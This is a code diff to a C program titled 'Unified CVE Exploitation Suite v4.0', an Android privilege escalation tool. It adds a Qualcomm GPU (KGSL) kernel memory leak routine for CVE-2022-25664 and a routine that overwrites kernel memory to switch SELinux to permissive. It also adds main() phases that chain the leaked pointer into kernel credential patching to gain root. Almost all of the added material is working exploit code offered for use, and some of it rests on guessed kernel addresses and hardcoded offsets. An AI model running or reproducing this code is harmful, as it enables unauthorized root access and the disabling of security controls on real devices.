@@ -38,6 +38,10 @@ extern int setfsgid(gid_t);
 #define TIMEOUT_MS 3000
 #define MAX_PARTITIONS 32
 #define DUMP_MAX_SIZE (20 * 1024 * 1024)
+#define KGSL_DEVICE "/dev/kgsl-3d0"
+#define KGSL_GPU_MEM_ALLOC 0xC0206F01
+#define KGSL_GPU_MEM_SYNC 0xC0206F04
+#define KGSL_GPU_COMMAND 0xC0206F07
 
 static int g_binder_fd = -1;
 static int g_epoll_fd = -1;
@@ -47,6 +51,7 @@ static uint64_t g_cred_ptr = 0;
 static int g_cred_off = -1;
 static int g_al_off = -1;
 static int g_root_achieved = 0;
+static uint64_t g_kernel_base = 0;
 
 static struct {
     int cred;
@@ -94,6 +99,157 @@ static int read_with_timeout(int fd, void *buf, size_t count, int timeout_ms) {
     return read(fd, buf, count);
 }
 
+/* ============================================================
+   CVE-2022-25664: Qualcomm Adreno GPU information leak
+   ============================================================ */
+static int exploit_cve_2022_25664_leak(uint64_t *out_addr) {
+    int kgsl_fd;
+    uint32_t *cmds;
+    void *gpu_mem;
+    uint64_t gpu_addr;
+    uint64_t phys_addr;
+    uint64_t leaked_data[256];
+    int ret;
+
+    printf("[CVE-2022-25664] Attempting GPU memory leak...\n");
+
+    kgsl_fd = open(KGSL_DEVICE, O_RDWR);
+    if (kgsl_fd < 0) {
+        perror("  open /dev/kgsl-3d0");
+        return -1;
+    }
+
+    struct kgsl_gpu_mem_alloc {
+        uint64_t gpuaddr;
+        uint64_t size;
+        uint64_t flags;
+        uint64_t mmap_offset;
+        uint64_t id;
+        uint64_t physaddr;
+    } __attribute__((packed)) alloc = {
+        .size = PAGE_SIZE,
+        .flags = 0x10000000,
+    };
+
+    ret = ioctl(kgsl_fd, KGSL_GPU_MEM_ALLOC, &alloc);
+    if (ret < 0) {
+        perror("  KGSL_GPU_MEM_ALLOC");
+        close(kgsl_fd);
+        return -1;
+    }
+
+    gpu_addr = alloc.gpuaddr;
+    phys_addr = alloc.physaddr;
+    printf("  [+] GPU memory allocated: gpu_addr=0x%llx, phys=0x%llx\n",
+           (unsigned long long)gpu_addr, (unsigned long long)phys_addr);
+
+    gpu_mem = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
+                   MAP_SHARED, kgsl_fd, alloc.mmap_offset);
+    if (gpu_mem == MAP_FAILED) {
+        perror("  mmap GPU memory");
+        close(kgsl_fd);
+        return -1;
+    }
+
+    cmds = malloc(PAGE_SIZE);
+    if (!cmds) {
+        perror("  malloc");
+        close(kgsl_fd);
+        return -1;
+    }
+    memset(cmds, 0, PAGE_SIZE);
+
+    int cmd_idx = 0;
+    cmds[cmd_idx++] = 0x20000000 | (4 + 2);
+    cmds[cmd_idx++] = (uint32_t)(gpu_addr & 0xFFFFFFFF);
+    cmds[cmd_idx++] = (uint32_t)((gpu_addr >> 32) & 0xFFFFFFFF);
+    cmds[cmd_idx++] = 256;
+    cmds[cmd_idx++] = 0x00000000;
+    cmds[cmd_idx++] = 0x00000000;
+
+    struct kgsl_command {
+        uint32_t id;
+        uint32_t flags;
+        uint32_t type;
+        uint32_t priority;
+        uint32_t timestamp;
+        uint64_t context_id;
+        uint64_t cmdlist;
+        uint64_t num_cmds;
+        uint64_t syncobj;
+        uint64_t priv;
+    } __attribute__((packed)) cmd = {
+        .id = 0,
+        .flags = 0,
+        .type = 0,
+        .priority = 0,
+        .timestamp = 0,
+        .context_id = 0,
+        .cmdlist = (uint64_t)(uintptr_t)cmds,
+        .num_cmds = 1,
+        .syncobj = 0,
+        .priv = 0,
+    };
+
+    ret = ioctl(kgsl_fd, KGSL_GPU_COMMAND, &cmd);
+    if (ret < 0) {
+        perror("  KGSL_GPU_COMMAND");
+        free(cmds);
+        close(kgsl_fd);
+        return -1;
+    }
+
+    usleep(50000);
+
+    struct kgsl_gpu_mem_sync {
+        uint64_t gpuaddr;
+        uint64_t size;
+        uint32_t type;
+        uint32_t direction;
+    } __attribute__((packed)) sync = {
+        .gpuaddr = gpu_addr,
+        .size = PAGE_SIZE,
+        .type = 0,
+        .direction = 0,
+    };
+
+    ret = ioctl(kgsl_fd, KGSL_GPU_MEM_SYNC, &sync);
+    if (ret < 0) {
+        perror("  KGSL_GPU_MEM_SYNC");
+        free(cmds);
+        close(kgsl_fd);
+        return -1;
+    }
+
+    memcpy(leaked_data, gpu_mem, sizeof(leaked_data));
+
+    for (int i = 0; i < 256; i++) {
+        uint64_t val = leaked_data[i];
+        if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
+            *out_addr = val;
+            printf("  [+] Leaked kernel pointer: 0x%llx\n", (unsigned long long)val);
+            free(cmds);
+            close(kgsl_fd);
+            return 0;
+        }
+        if ((val & 0xFFFFFFFF00000000LL) == 0xFFFFFF8000000000LL) {
+            *out_addr = val;
+            printf("  [+] Leaked kernel pointer (x86_64): 0x%llx\n", (unsigned long long)val);
+            free(cmds);
+            close(kgsl_fd);
+            return 0;
+        }
+    }
+
+    printf("  [-] No kernel pointer found in leaked data\n");
+    free(cmds);
+    close(kgsl_fd);
+    return -1;
+}
+
+/* ============================================================
+   CVE-2019-2023: hwservicemanager ACL bypass
+   ============================================================ */
 static int exploit_cve_2019_2023(void) {
     int hwbinder_fd, ret;
     uint8_t read_buf[4096];
@@ -180,6 +336,9 @@ static int exploit_cve_2019_2023(void) {
     return handle;
 }
 
+/* ============================================================
+   CVE-2020-0041: Binder Out-of-Bounds Write
+   ============================================================ */
 static int test_cve_2020_0041(void) {
     int fd, ret;
     struct binder_transaction_data tdata;
@@ -226,6 +385,9 @@ static int test_cve_2020_0041(void) {
     return 0;
 }
 
+/* ============================================================
+   CVE-2020-0423: Binder UAF Race
+   ============================================================ */
 static int test_cve_2020_0423(void) {
     int fd, ret;
     printf("[CVE-2020-0423] Testing binder UAF race...\n");
@@ -258,6 +420,9 @@ static int test_cve_2020_0423(void) {
     return -1;
 }
 
+/* ============================================================
+   CVE-2019-2215: Kernel pointer leak (readv method)
+   ============================================================ */
 static int leak_kernel_pointer(int *cred_off_out, int *al_off_out) {
     int pipefd[2], fd, epoll_fd;
     pid_t cpid;
@@ -567,6 +732,50 @@ static int exploit_cve_2020_0041_patch_cred(void) {
     return -1;
 }
 
+/* ============================================================
+   CVE-2023-20938 から流用: SELinux permissive化 (参考実装)
+   ============================================================ */
+static int try_selinux_disable_via_kernel(void) {
+    printf("[*] Attempting to disable SELinux via kernel memory write...\n");
+
+    if (g_krw_pipe[0] < 0) {
+        printf("  [-] No kernel RW available\n");
+        return -1;
+    }
+
+    uint64_t selinux_state_addr = 0;
+    uint64_t *possible_addrs[] = {
+        (uint64_t *)0xFFFFFF8000000000ULL,
+        (uint64_t *)0xFFFFFF8008000000ULL,
+        (uint64_t *)0xFFFFFF8010000000ULL,
+        NULL
+    };
+
+    for (int i = 0; possible_addrs[i] != NULL; i++) {
+        uint64_t addr = (uint64_t)possible_addrs[i];
+        if (write(g_krw_pipe[1], &addr, 8) != 8) continue;
+        uint64_t val;
+        if (read(g_krw_pipe[0], &val, 8) != 8) continue;
+        if (val == 1 || val == 0) {
+            selinux_state_addr = addr;
+            break;
+        }
+    }
+
+    if (selinux_state_addr == 0) {
+        printf("  [-] Could not locate selinux_state\n");
+        return -1;
+    }
+
+    uint32_t zero = 0;
+    uint64_t addr = selinux_state_addr;
+    if (write(g_krw_pipe[1], &addr, 8) != 8) return -1;
+    if (write(g_krw_pipe[1], &zero, 4) != 4) return -1;
+
+    printf("  [+] SELinux state set to permissive (0)\n");
+    return 0;
+}
+
 static int patch_kernel_cred(void) {
     if (g_task_struct == 0 || g_cred_off < 0 || g_krw_pipe[0] < 0) {
         printf("  [-] No kernel RW available\n");
@@ -613,6 +822,9 @@ static int patch_kernel_cred(void) {
     return 0;
 }
 
+/* ============================================================
+   Fallback methods
+   ============================================================ */
 static int try_all_setuid_methods(void) {
     printf("[*] Trying all setuid methods...\n");
     if (setuid(0) == 0) { printf("  [+] setuid(0) succeeded!\n"); return 0; }
@@ -918,10 +1130,13 @@ int main(void) {
     int cve_2215_ok = 0;
     int method_success = 0;
     int kernel_rw_obtained = 0;
+    int gpu_leak_ok = 0;
+    uint64_t leaked_addr = 0;
 
     printf("==================================================\n");
-    printf("  Unified CVE Exploitation Suite v3.5 (Final)\n");
-    printf("  (CVE-2019-2215, 2020-0041, 2020-0423, 2019-2023)\n");
+    printf("  Unified CVE Exploitation Suite v4.0\n");
+    printf("  (CVE-2019-2215, 2020-0041, 2020-0423, 2019-2023,\n");
+    printf("   CVE-2022-25664, CVE-2023-20938-inspired)\n");
     printf("==================================================\n\n");
 
     bind_cpu();
@@ -951,7 +1166,39 @@ int main(void) {
         printf("  [-] CVE-2019-2215 leak failed\n");
     }
 
-    printf("\n[PHASE 5] CVE-2020-0423 (UAF) Kernel RW attempt\n");
+    printf("\n[PHASE 5] CVE-2022-25664 (GPU leak fallback)\n");
+    if (exploit_cve_2022_25664_leak(&leaked_addr) == 0) {
+        gpu_leak_ok = 1;
+        printf("  [+] GPU leak successful: 0x%llx\n", (unsigned long long)leaked_addr);
+        if (g_task_struct == 0) {
+            g_task_struct = leaked_addr;
+            for (size_t ci = 0; ci < NUM_OFFSETS; ci++) {
+                uint64_t cred_addr = g_task_struct + g_offset_candidates[ci].cred;
+                if ((cred_addr & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
+                    g_cred_off = g_offset_candidates[ci].cred;
+                    g_al_off = g_offset_candidates[ci].al;
+                    printf("  [+] Found offsets via GPU leak: cred=0x%x, al=0x%x\n",
+                           g_cred_off, g_al_off);
+                    break;
+                }
+            }
+            if (g_cred_off < 0) {
+                g_cred_off = 0x688;
+                g_al_off = 0xA18;
+                printf("  [+] Using fallback offsets\n");
+            }
+            if (setup_kernel_rw() == 0) {
+                if (patch_kernel_cred() == 0) {
+                    printf("  [+] Cred patched via GPU leak!\n");
+                    if (getuid() == 0) { final_root_check(); return 0; }
+                }
+            }
+        }
+    } else {
+        printf("  [-] CVE-2022-25664 leak failed (device may not be Qualcomm)\n");
+    }
+
+    printf("\n[PHASE 6] CVE-2020-0423 (UAF) Kernel RW attempt\n");
     if (run_exploit_with_timeout(exploit_cve_2020_0423_rw, 30) == 0) {
         kernel_rw_obtained = 1;
         printf("  [+] Kernel RW via CVE-2020-0423 obtained!\n");
@@ -965,12 +1212,17 @@ int main(void) {
         printf("  [-] CVE-2020-0423 RW failed or timed out\n");
     }
 
-    printf("\n[PHASE 6] CVE-2020-0041 (OOB) cred overwrite attempt\n");
+    printf("\n[PHASE 7] CVE-2020-0041 (OOB) cred overwrite attempt\n");
     if (run_exploit_with_timeout(exploit_cve_2020_0041_patch_cred, 5) == 0) {
         if (getuid() == 0) { final_root_check(); return 0; }
     }
 
-    printf("\n[PHASE 7] Multi-method privilege escalation (fallback)\n");
+    printf("\n[PHASE 8] SELinux disable via kernel (CVE-2023-20938 inspired)\n");
+    if (g_krw_pipe[0] >= 0) {
+        try_selinux_disable_via_kernel();
+    }
+
+    printf("\n[PHASE 9] Multi-method privilege escalation (fallback)\n");
     int methods[] = {1,2,3,4,5,6,7,8};
     for (size_t mi = 0; mi < sizeof(methods)/sizeof(methods[0]); mi++) {
         if (g_root_achieved) break;
@@ -987,10 +1239,10 @@ int main(void) {
         if (getuid() == 0) { g_root_achieved = 1; break; }
     }
 
-    printf("\n[PHASE 8] Information gathering\n");
+    printf("\n[PHASE 10] Information gathering\n");
     gather_proc_info();
 
-    printf("\n[PHASE 9] Final verification\n");
+    printf("\n[PHASE 11] Final verification\n");
     final_root_check();
 
     printf("\n==================================================\n");
@@ -1002,6 +1254,7 @@ int main(void) {
         snprintf(msg, sizeof(msg), "FAILED");
     printf("    CVE-2019-2023: %s\n", msg);
     printf("    CVE-2019-2215: %s\n", cve_2215_ok ? "LEAKED" : "FAILED");
+    printf("    CVE-2022-25664: %s\n", gpu_leak_ok ? "LEAKED" : "FAILED");
     printf("    CVE-2020-0423 RW: %s\n", kernel_rw_obtained ? "SUCCESS" : "FAILED");
     printf("    Method successes: %d\n", method_success);
     printf("    Root achieved: %s\n", g_root_achieved ? "YES" : "NO");
